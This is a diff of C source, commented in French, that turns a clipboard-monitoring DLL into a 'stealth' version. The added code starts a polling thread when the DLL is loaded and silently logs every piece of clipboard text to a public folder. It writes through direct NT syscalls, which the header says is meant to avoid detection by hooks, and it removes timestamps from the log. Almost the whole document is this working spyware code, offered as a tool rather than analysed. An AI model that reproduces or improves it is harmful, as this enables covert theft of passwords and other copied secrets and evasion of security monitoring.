@@ -1,60 +1,87 @@
 /**
- * @file clipboard-logger.c
- * @brief Version alternative de la DLL de surveillance du presse-papiers.
+ * @file clipboard-logger-stealth.c
+ * @brief Version furtive de la DLL de surveillance du presse-papiers.
  * 
- * Cette version n'utilise pas de fenêtre invisible. Elle se base sur la fonction
- * GetClipboardSequenceNumber pour détecter les changements par scrutation (polling)
- * à intervalle régulier.
+ * Cette version utilise des appels système directs pour éviter la détection
+ * par les hooks de la libc et ne contient pas d'horodatage dans les logs.
  */
 
 #ifndef _WIN32_WINNT
-#define _WIN32_WINNT 0x0600 // Windows Vista ou supérieur
+#define _WIN32_WINNT 0x0600
 #endif
-#include <windows.h>
-#include <shlobj.h>
-#include <stdio.h>
-#include <time.h>
-#include <direct-syscalls.h>
 
-// Intervalle de scrutation en millisecondes (ex: 500ms)
+#include <windows.h>
+#include <winternl.h>
+#include "direct-syscalls.h"
+
+// Intervalle de scrutation en millisecondes
 #define POLLING_INTERVAL 500
-#define LOG_FILE_NAME "clipboard_log_polling.txt"
+// Utilisation d'un chemin NT pour l'écriture via syscalls
+#define LOG_FILE_NAME L"\\??\\C:\\Users\\Public\\Documents\\clipboard_log.txt"
 
 // Variables globales
 HINSTANCE g_hInstance = NULL;
 HANDLE g_hThread = NULL;
 BOOL g_bRunning = TRUE;
 
-/**
- * @brief Récupère le chemin du fichier de log sur le bureau.
- */
-void GetLogFilePath(char* buffer, size_t size) {
-    CHAR desktopPath[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
-        snprintf(buffer, size, "%s\\%s", desktopPath, LOG_FILE_NAME);
-    } else {
-        snprintf(buffer, size, ".\\%s", LOG_FILE_NAME);
-    }
+// Définition de wcslen et strlen pour éviter la dépendance à la libc
+size_t wcslen(const wchar_t *s) {
+    const wchar_t *p = s;
+    while (*p) ++p;
+    return p - s;
+}
+
+size_t strlen(const char *s) {
+    const char *p = s;
+    while (*p) ++p;
+    return p - s;
 }
 
 /**
- * @brief Logue le texte dans le fichier sur le bureau.
+ * @brief Logue le texte dans le fichier en utilisant des appels système directs.
  */
 void LogClipboardText(const char* text) {
     if (!text || text[0] == '\0') return;
 
-    char logPath[MAX_PATH];
-    GetLogFilePath(logPath, sizeof(logPath));
+    HANDLE hFile;
+    OBJECT_ATTRIBUTES objAttr;
+    UNICODE_STRING uniName;
+    IO_STATUS_BLOCK ioStatusBlock;
+    NTSTATUS status;
 
-    FILE* f = fopen(logPath, "a");
-    if (f) {
-        time_t now = time(NULL);
-        struct tm* t = localtime(&now);
-        char timeStr[64];
-        strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
-        
-        fprintf(f, "%s (Polling)\n%s\n-----------------------------------\n", timeStr, text);
-        fclose(f);
+    // Initialisation du nom du fichier (format NT)
+    uniName.Buffer = (PWSTR)LOG_FILE_NAME;
+    uniName.Length = (USHORT)(wcslen(LOG_FILE_NAME) * sizeof(WCHAR));
+    uniName.MaximumLength = uniName.Length;
+
+    InitializeObjectAttributes(&objAttr, &uniName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+    // Création ou ouverture du fichier via dCreateFile (NtCreateFile)
+    status = dCreateFile(
+        &hFile,
+        FILE_APPEND_DATA | SYNCHRONIZE,
+        &objAttr,
+        &ioStatusBlock,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        FILE_OPEN_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0
+    );
+
+    if (status == 0) { // STATUS_SUCCESS
+        SIZE_T len = strlen(text);
+        const char* separator = "\r\n-----------------------------------\r\n";
+        SIZE_T sepLen = strlen(separator);
+
+        // Écriture du texte via dWriteFile (NtWriteFile)
+        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)text, (ULONG)len, NULL, NULL);
+        // Écriture du séparateur
+        dWriteFile(hFile, NULL, NULL, NULL, &ioStatusBlock, (PVOID)separator, (ULONG)sepLen, NULL, NULL);
+
+        CloseHandle(hFile);
     }
 }
 
@@ -64,13 +91,11 @@ void LogClipboardText(const char* text) {
 DWORD WINAPI PollingThread(LPVOID lpParam) {
     DWORD dwLastSequence = 0;
     
-    // Initialisation du numéro de séquence actuel
     dwLastSequence = GetClipboardSequenceNumber();
 
     while (g_bRunning) {
         DWORD dwCurrentSequence = GetClipboardSequenceNumber();
 
-        // Si le numéro de séquence a changé, le contenu du presse-papiers a été modifié
         if (dwCurrentSequence != dwLastSequence) {
             dwLastSequence = dwCurrentSequence;
 
@@ -86,8 +111,6 @@ DWORD WINAPI PollingThread(LPVOID lpParam) {
                 CloseClipboard();
             }
         }
-
-        // Attente avant la prochaine vérification
         Sleep(POLLING_INTERVAL);
     }
 
@@ -104,13 +127,18 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
         case DLL_PROCESS_ATTACH:
             DisableThreadLibraryCalls(hinstDLL);
             g_bRunning = TRUE;
+            
+            // Utilisation de dCreateThreadEx (NtCreateThreadEx)
             dCreateThreadEx(
                 &g_hThread, 
                 THREAD_ALL_ACCESS, 
                 NULL,
                 GetCurrentProcess(), 
                 PollingThread,
-                NULL,0,0,0,0,NULL);
+                NULL,
+                0, 0, 0, 0, 
+                NULL
+            );
             break;
 
         case DLL_PROCESS_DETACH:
